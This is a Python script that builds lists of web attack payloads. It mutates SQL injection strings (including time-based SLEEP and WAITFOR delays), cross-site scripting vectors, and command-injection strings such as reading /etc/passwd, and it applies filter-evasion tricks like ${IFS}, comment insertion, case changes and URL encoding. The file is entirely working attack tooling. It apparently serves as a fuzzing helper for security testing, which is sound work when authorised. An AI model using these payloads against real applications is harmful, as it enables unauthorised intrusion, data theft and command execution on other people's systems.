from urllib.parse import quote


def _dedupe_preserve_order(values):
    seen = set()
    output = []
    for item in values:
        if item not in seen:
            seen.add(item)
            output.append(item)
    return output


def generate_sqli_payloads():
    base = [
        "' OR 1=1--",
        "' OR '1'='1",
        "1 OR 1=1",
        "1' OR '1'='1",
        "' OR SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
    ]

    mutations = []
    for p in base:
        mutations.extend(
            [
                p,
                p.replace(" ", "/**/"),
                p + "#",
                p + "--",
                p.upper(),
                p.lower(),
                p.replace("OR", "oR"),
                p.replace(" ", "%20"),
            ]
        )

    return _dedupe_preserve_order(mutations)


def generate_xss_payloads():
    base = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "\" onmouseover=\"alert(1)",
    ]

    mutations = []
    for p in base:
        mutations.extend(
            [
                p,
                p.replace("alert(1)", "alert(document.domain)"),
                p.replace("<script>", "<ScRiPt>"),
                p.replace("=", " = "),
                p.replace("alert", "confirm"),
                quote(p),
            ]
        )

    return _dedupe_preserve_order(mutations)


def generate_cmd_payloads():
    base = [
        "; ls",
        "&& whoami",
        "| id",
        "; cat /etc/passwd",
        "&& type C:\\Windows\\win.ini",
    ]

    mutations = []
    for p in base:
        mutations.extend(
            [
                p,
                p + " #",
                p.replace(" ", "${IFS}"),
                p.upper(),
                quote(p),
            ]
        )

    return _dedupe_preserve_order(mutations)


def generate_all_payloads():
    return {
        "sqli": generate_sqli_payloads(),
        "xss": generate_xss_payloads(),
        "cmd": generate_cmd_payloads(),
    }


if __name__ == "__main__":
    payloads = generate_all_payloads()
    print("\nSQLi Payloads:", len(payloads["sqli"]))
    print("XSS Payloads:", len(payloads["xss"]))
    print("CMD Payloads:", len(payloads["cmd"]))